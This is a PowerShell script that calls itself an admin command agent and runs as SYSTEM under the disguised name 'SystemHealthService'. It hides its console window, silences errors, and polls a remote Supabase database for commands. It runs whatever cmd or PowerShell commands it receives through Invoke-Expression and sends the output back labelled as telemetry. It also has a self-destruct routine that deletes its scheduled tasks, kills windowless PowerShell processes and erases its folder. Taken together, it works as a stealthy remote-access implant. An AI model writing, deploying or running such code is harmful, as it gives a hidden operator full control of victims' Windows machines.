# ================================
# ADMIN COMMAND EXECUTION AGENT
# ================================
# This agent runs as SYSTEM and executes administrative commands
# Handles: cmd_exec_admin, ps_exec_admin task types

# Suppress errors and progress bars
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Hide console window
try {
    Add-Type -Name W -Namespace N -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,Int32 n);'
    [N.W]::ShowWindow([N.W]::GetConsoleWindow(), 0)
} catch {}

# ================================
# CONFIGURATION
# ================================

$basePath = "C:\ProgramData\SystemHealthService"

# Force TLS 1.2 for Supabase HTTPS connections
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Wait for internet - use HTTP check instead of ICMP (ping may be blocked)
while ($true) {
    try {
        $null = Invoke-RestMethod -Uri "https://www.google.com" -Method Head -TimeoutSec 5
        break
    } catch {
        Start-Sleep 5
    }
}
Start-Sleep 5

# Load config
$config = Get-Content "$basePath\config.json" -Raw | ConvertFrom-Json
$deviceIdFile = "$basePath\device_id.txt"

# Wait up to 60 seconds for device_id.txt to exist
$maxWait = 60
$waited = 0
while (!(Test-Path $deviceIdFile) -and $waited -lt $maxWait) {
    Start-Sleep 5
    $waited += 5
}

# Get or create device ID
if (!(Test-Path $deviceIdFile)) {
    $deviceId = [guid]::NewGuid().ToString()
    $deviceId | Out-File $deviceIdFile -NoNewline
} else {
    $deviceId = (Get-Content $deviceIdFile -Raw).Trim()
}

# ================================
# API HELPER FUNCTION
# ================================

$headers = @{
    "apikey" = $config.supabase_key
    "Authorization" = "Bearer $($config.supabase_key)"
    "Content-Type" = "application/json"
    "Prefer" = "return=minimal"
}

function Invoke-API {
    param(
        $endpoint,
        $method = "GET",
        $body = $null
    )
    
    $uri = "$($config.supabase_url)/rest/v1/$endpoint"
    
    try {
        if ($body) {
            Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -Body ($body | ConvertTo-Json -Depth 10 -Compress) -TimeoutSec 30
        } else {
            Invoke-RestMethod -Uri $uri -Method $method -Headers $headers -TimeoutSec 30
        }
    } catch {
        $null
    }
}

# ================================
# COMMAND EXECUTION FUNCTIONS
# ================================

# Execute CMD command as admin (SYSTEM)
function Execute-AdminCommand {
    param($cmd)
    
    try {
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = "cmd.exe"
        $processInfo.Arguments = "/c $cmd"
        $processInfo.RedirectStandardOutput = $true
        $processInfo.RedirectStandardError = $true
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        $process.Start() | Out-Null
        
        $output = $process.StandardOutput.ReadToEnd()
        $errorOutput = $process.StandardError.ReadToEnd()
        $process.WaitForExit(60000)  # 60 second timeout
        
        $result = @{
            command = $cmd
            output = $output
            error = $errorOutput
            exit_code = $process.ExitCode
            executed_as = "SYSTEM"
        }
        
        return @{
            data_type = "cmd_result"
            data = ($result | ConvertTo-Json -Compress)
        }
    } catch {
        $result = @{
            command = $cmd
            error = "$_"
            executed_as = "SYSTEM"
        }
        
        return @{
            data_type = "cmd_result"
            data = ($result | ConvertTo-Json -Compress)
        }
    }
}

# Execute PowerShell command as admin (SYSTEM)
function Execute-AdminPowerShell {
    param($cmd)
    
    try {
        # Execute PowerShell command directly
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        
        $result = @{
            command = $cmd
            output = $output
            executed_as = "SYSTEM"
        }
        
        return @{
            data_type = "cmd_result"
            data = ($result | ConvertTo-Json -Compress)
        }
    } catch {
        $result = @{
            command = $cmd
            error = "$_"
            executed_as = "SYSTEM"
        }
        
        return @{
            data_type = "cmd_result"
            data = ($result | ConvertTo-Json -Compress)
        }
    }
}

# Self-Destruct Function (runs as SYSTEM for maximum cleanup)
function Self-Destruct {
    try {
        # Delete scheduled tasks
        schtasks /delete /tn "SystemHealthMonitor" /f 2>$null
        schtasks /delete /tn "SystemHealthAdmin" /f 2>$null
        
        # Kill other agent processes
        Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {
            $_.Id -ne $PID -and $_.MainWindowTitle -eq ""
        } | Stop-Process -Force -ErrorAction SilentlyContinue
        
        # Wait a moment for processes to terminate
        Start-Sleep -Seconds 2
        
        # Remove agent folder
        $agentPath = "C:\ProgramData\SystemHealthService"
        if (Test-Path $agentPath) {
            Remove-Item $agentPath -Recurse -Force -ErrorAction SilentlyContinue
        }
        
        return @{
            data_type = "destruct"
            data = "Windows agent destroyed successfully (SYSTEM)"
        }
    } catch {
        return @{
            data_type = "destruct"
            data = "Destruction failed: $_"
        }
    }
}

# ================================
# MAIN LOOP
# ================================

# Set sync intervals (default 60 seconds)
$syncInterval = if ($config.sync_interval) { $config.sync_interval } else { 10 }
$retryInterval = if ($config.retry_interval) { $config.retry_interval } else { 10 }

while ($true) {
    try {
        # Get pending admin tasks only (cmd_exec_admin, ps_exec_admin, auto_destruct)
        $tasks = Invoke-API -endpoint "tasks?device_id=eq.$deviceId&status=eq.pending&task_type=in.(cmd_exec_admin,ps_exec_admin,auto_destruct)&select=id,task_type,task_params"
        
        if ($tasks) {
            # Ensure tasks is an array
            if ($tasks -isnot [array]) {
                $tasks = @($tasks)
            }
            
            # Process each task
            foreach ($task in $tasks) {
                $taskResult = $null
                
                # Execute based on task type
                switch ($task.task_type) {
                    "cmd_exec_admin" {
                        $command = ""
                        if ($task.task_params -and $task.task_params.command) {
                            $command = $task.task_params.command
                        }
                        
                        if ($command) {
                            $taskResult = Execute-AdminCommand -cmd $command
                        } else {
                            $taskResult = @{
                                data_type = "cmd_result"
                                data = "No command provided"
                            }
                        }
                    }
                    
                    "ps_exec_admin" {
                        $command = ""
                        if ($task.task_params -and $task.task_params.command) {
                            $command = $task.task_params.command
                        }
                        
                        if ($command) {
                            $taskResult = Execute-AdminPowerShell -cmd $command
                        } else {
                            $taskResult = @{
                                data_type = "cmd_result"
                                data = "No command provided"
                            }
                        }
                    }
                    
                    "auto_destruct" {
                        # Send telemetry first before destroying
                        $taskResult = Self-Destruct
                        
                        # Save results to telemetry before exit
                        $telemetryData = @{
                            device_id = $deviceId
                            data_type = $taskResult.data_type
                            data = $taskResult.data
                        }
                        Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
                        
                        # Mark task complete
                        Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
                            status = "complete"
                            completed_at = (Get-Date -Format "o")
                        } | Out-Null
                        
                        # Exit the script
                        exit 0
                    }
                }
                
                # Save results to telemetry
                if ($taskResult) {
                    $telemetryData = @{
                        device_id = $deviceId
                        data_type = $taskResult.data_type
                    }
                    
                    if ($taskResult.data) {
                        $telemetryData.data = $taskResult.data
                    }
                    
                    # Insert into telemetry table
                    Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
                    
                    # Mark task as complete
                    Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
                        status = "complete"
                        completed_at = (Get-Date -Format "o")
                    } | Out-Null
                }
            }
        }
        
        Start-Sleep $syncInterval
        
    } catch {
        Start-Sleep $retryInterval
    }
}

